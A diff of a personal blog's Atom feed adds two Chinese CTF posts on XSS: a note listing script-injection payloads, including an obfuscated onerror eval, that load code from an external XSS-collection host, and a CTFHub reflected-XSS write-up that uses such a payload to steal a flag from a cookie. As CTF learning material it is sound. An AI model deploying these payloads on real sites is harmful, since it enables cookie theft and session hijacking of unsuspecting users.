@@ -6,7 +6,7 @@
   <link href="https://s1gma0.github.io/atom.xml" rel="self"/>
   
   <link href="https://s1gma0.github.io/"/>
-  <updated>2021-12-04T17:26:44.737Z</updated>
+  <updated>2021-12-05T03:26:43.221Z</updated>
   <id>https://s1gma0.github.io/</id>
   
   <author>
@@ -15,6 +15,64 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XSSplatform</title>
+    <link href="https://s1gma0.github.io/2021/12/05/XSSplatform/"/>
+    <id>https://s1gma0.github.io/2021/12/05/XSSplatform/</id>
+    <published>2021-12-05T02:57:50.000Z</published>
+    <updated>2021-12-05T03:26:43.221Z</updated>
+    
+    <content type="html"><![CDATA[<p>将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxsscom.com%2F%2Fa0zR72%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;</span><br></pre></td></tr></table></figure><p>再或者以你任何想要的方式插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xsscom.com//a0zR72</span><br></pre></td></tr></table></figure><p>再或者以你任何想要的方式插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://s1gma0.github.io/category/CTF/"/>
+    
+    
+    <category term="Web" scheme="https://s1gma0.github.io/tag/Web/"/>
+    
+    <category term="XSS" scheme="https://s1gma0.github.io/tag/XSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>反射型XSS</title>
+    <link href="https://s1gma0.github.io/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
+    <id>https://s1gma0.github.io/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/</id>
+    <published>2021-12-05T02:28:01.000Z</published>
+    <updated>2021-12-05T03:47:01.018Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一、寻找漏洞"><a href="#一、寻找漏洞" class="headerlink" title="一、寻找漏洞"></a>一、寻找漏洞</h1><p>在搜索框中随意输入字符，发现输入的字符直接出现在界面上。<br>然后输入特殊字符进行尝试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">//括号里的1可以为任意字符，将显示在弹窗界面上</span></span><br></pre></td></tr></table></figure><p>出现了弹窗，表明网页没有对用户的输入进行处理，直接输出到界面上。<br>XSS漏洞出现。</p><h1 id="二、实施攻击"><a href="#二、实施攻击" class="headerlink" title="二、实施攻击"></a>二、实施攻击</h1><p>在第一个搜索框中输入下面构造的payload，并点击submit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</span><br><span class="line">//这个payload将执行http://xsscom.com//a0zR72下的项目代码</span><br></pre></td></tr></table></figure><p>然后在网页源代码中查找到这个payload是完整的，同时submit点击之后，URL发生改变。</p><p>将改变后的URL在第二个搜索框中输入并send</p><p>此时XSS platform收到了报文，在cookies中发现了flag</p><p>cookie : flag=ctfhub{3efc235465db70e45070d143}</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;一、寻找漏洞&quot;&gt;&lt;a href=&quot;#一、寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;一、寻找漏洞&quot;&gt;&lt;/a&gt;一、寻找漏洞&lt;/h1&gt;&lt;p&gt;在搜索框中随意输入字符，发现输入的字符直接出现在界面上。&lt;br&gt;然后输入特殊字符进行尝试&lt;/p&gt;
+&lt;figu</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://s1gma0.github.io/category/CTF/"/>
+    
+    
+    <category term="WriteUp" scheme="https://s1gma0.github.io/tag/WriteUp/"/>
+    
+    <category term="Web" scheme="https://s1gma0.github.io/tag/Web/"/>
+    
+    <category term="XSS" scheme="https://s1gma0.github.io/tag/XSS/"/>
+    
+    <category term="CTFHub" scheme="https://s1gma0.github.io/tag/CTFHub/"/>
+    
+  </entry>
   
   <entry>
     <title>Hexo部署时Error: Spawn failed的解决办法</title>
@@ -97,7 +155,7 @@
     <link href="https://s1gma0.github.io/2021/11/25/jade6%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95_fail/"/>
     <id>https://s1gma0.github.io/2021/11/25/jade6%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95_fail/</id>
     <published>2021-11-24T16:09:37.000Z</published>
-    <updated>2021-12-04T17:24:59.212Z</updated>
+    <updated>2021-12-05T03:22:24.108Z</updated>
     
     <content type="html"><![CDATA[<h1 id="Jade-6安装方法"><a href="#Jade-6安装方法" class="headerlink" title="Jade 6安装方法"></a>Jade 6安装方法</h1><h2 id="更改兼容性"><a href="#更改兼容性" class="headerlink" title="更改兼容性"></a>更改兼容性</h2><p>点击exe先进行下载，然后找到jade6.exe将兼容性改为Windows 7。</p><h2 id="安装缺失控件"><a href="#安装缺失控件" class="headerlink" title="安装缺失控件"></a>安装缺失控件</h2><p>comdlg32.ocx</p><p>MSCOMCT2.OCX</p><p>MSCOMCTL.OCX</p><p>THREED32.OCX</p><p>将这几个控件和批处理程序移动到*<em>C:\Windows\SysWOW64*</em></p><p>然后运行一下批处理程序，即可。</p><h2 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h2><p>文件在Onedrive上有备份。</p><p>安装后由于注册表导入的用户名一直出错，导致pdf卡片无法导入，放弃该版本下载，改用其他下载。</p>]]></content>
     
